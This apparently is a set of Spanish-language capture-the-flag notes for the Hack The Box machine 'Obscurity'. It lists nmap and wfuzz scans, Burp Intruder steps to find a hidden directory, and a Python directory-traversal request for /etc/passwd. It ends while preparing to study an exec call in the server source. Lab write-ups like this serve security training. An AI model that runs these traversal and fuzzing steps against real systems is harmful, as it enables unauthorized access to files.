# Obscurity

IP: 10.10.10.168

## Ping y whichSystem.py

`ping -c 1 10.10.10.168`
`whichSystem.py 10.10.10.168`

## Nmap

`nmap -p- --open -T5 -v -n 10.10.10.168 -oN allPorts` --> va lento.
`nmap -p- -sS --min-rate 5000 --open -vvv -n 10.10.10.168 -oN allPorts` --> más rápido.

`nmap -sC -sV -p22,8080 10.10.10.168 -oN targetedPorts`
`nmap --script http-enum.nse -p8080 10.10.10.168 -oN webScan`

`whatweb http://10.10.10.168:8080`
- http://10.10.10.168:8080 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[secure@obscure.htb], HTML5, HTTPServer[BadHTTPServer], IP[10.10.10.168], JQuery, Script, Title[0bscura], X-UA-Compatible[IE=Edge]

- Wappalyzer --> nada relevante

## Probamos la web 
- En el texto pone un archivo SuperSecureServer.py
- Probamos a buscarlo en el navegador
- no funciona el ../../ --> lo probamos desde python con request
- python
>>> import requests
>>> r = requests.get("http://10.10.10.168/../hola")
>>> print r.text

>>> r = requests.get("http://10.10.10.168/../../../../../../../etc/passwd"

- Necesitamos buscar el directory secret

`wfuzz -c -t 500 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py`

## Burpsite

- Proxy --> Options --> Dont send items out of scope
- Target --> Scope --> Add --> http://10.10.10.168:8080

- Entramos en http://10.10.10.168:8080/a/SuperSecureServer.py
- Intruder --> Cambiamos nombre a Sniper  --> positions
- Seleccionamos /a/ --> Add (payload)
- Payloads --> Load dictionary en payload options
- Options --> Grep Extract --> add --> Document /a/Super.. not found --> Ok
- StartAttack

- Code Python --> CTLR + R --> Repeater go

- `cd ../content`
- `wget http://10.10.10.168:8080/develop/SuperSecureServer.py`


## Trabajamos con el py

`cat SuperSecureServer.py | grep -i "exec"`

- Añadimos la entrada del programa

if __name__ == '__main__':
    ws = Server('127.0.0.1', 80)
    ws.listen()


import pdb

pdb.set_trace()
exec...